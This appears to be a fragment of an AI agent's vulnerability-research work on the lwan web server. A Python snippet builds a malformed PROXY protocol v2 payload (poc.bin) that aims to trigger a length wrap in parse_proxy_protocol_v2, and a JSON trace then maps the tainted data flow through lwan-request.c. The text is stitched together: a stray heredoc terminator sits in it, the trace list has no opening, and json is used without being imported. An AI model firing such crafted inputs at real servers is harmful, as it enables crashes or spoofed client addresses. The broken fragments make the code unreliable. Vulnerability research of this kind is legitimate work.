from pathlib import Path
p=Path('/workspace/poc.bin')
# Try to trigger a malformed length leading to negative adjusted_size wrap when buffer += size exceeds remaining buffer.
sig=b'\r\n\r\n\x00\r\nQUIT\n'
# len=0x0030 => size=64, bigger than actual header payload but <= struct size? struct size likely 44; use 0x001c maybe 44.
header=sig+bytes([0x21,0x11,0x00,0x1c])+b'\x01\x02\x03\x04\x05\x06\x07\x08\x12\x34\x56\x78'+b'X'*16
body=b'GET /quit-lwan HTTP/1.0\r\nHost: x\r\n\r\n'
p.write_bytes(header+body)
print(len(header), len(body))
PY

{"step":2,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol","line":1159,"var":"buffer","code":"return parse_proxy_protocol_v2(request, buffer);","note":"The CRLFCRLF prefix selects the v2 path for the attacker-controlled input."},
{"step":3,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":225,"var":"hdr","code":"struct proxy_header_v2 *hdr = (struct proxy_header_v2 *)buffer;","note":"The parser reinterprets the first bytes as the PROXY v2 header struct."},
{"step":4,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":232,"var":"size","code":"size = proto_signature_length + (unsigned int)ntohs(hdr->len);","note":"The untrusted length field controls how many bytes the parser thinks belong to the header."},
{"step":5,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":233,"var":"size","code":"if (UNLIKELY(size > (unsigned int)sizeof(*hdr))) return NULL;","note":"The crafted size is chosen to exercise the boundary between accepted and rejected header lengths."},
{"step":6,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":243,"var":"proxy->from.ipv4 / proxy->to.ipv4","code":"from->sin_addr.s_addr = hdr->addr.ip4.src_addr; to->sin_addr.s_addr = hdr->addr.ip4.dst_addr;","note":"For TCP4, the parser copies attacker-controlled addresses into the proxy state."},
{"step":7,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":271,"var":"request->flags","code":"request->flags |= REQUEST_PROXIED;","note":"Setting the proxied flag tells later code to trust the parsed remote address."},
{"step":8,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":273,"var":"buffer","code":"buffer += size;","note":"The parser advances past the declared header length before resuming parsing of the remainder."},
{"step":9,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":279,"var":"helper->crlfcrlf","code":"helper->crlfcrlf = memmem(buffer, adjusted_size, \"\\r\\n\\r\\n\", 4);","note":"The remaining payload is rescanned for the HTTP separator using the adjusted size computed after the advance."},
{"step":10,"file":"src/lib/lwan-request.c","function":"parse_http_request","line":1180,"var":"path","code":"char *path = identify_http_method(request, buffer);","note":"After proxy parsing, the bytes after the header are treated as the HTTP request line."}
]
Path('/workspace/candidate_trace.json').write_text(json.dumps(trace,separators=(',',':')))
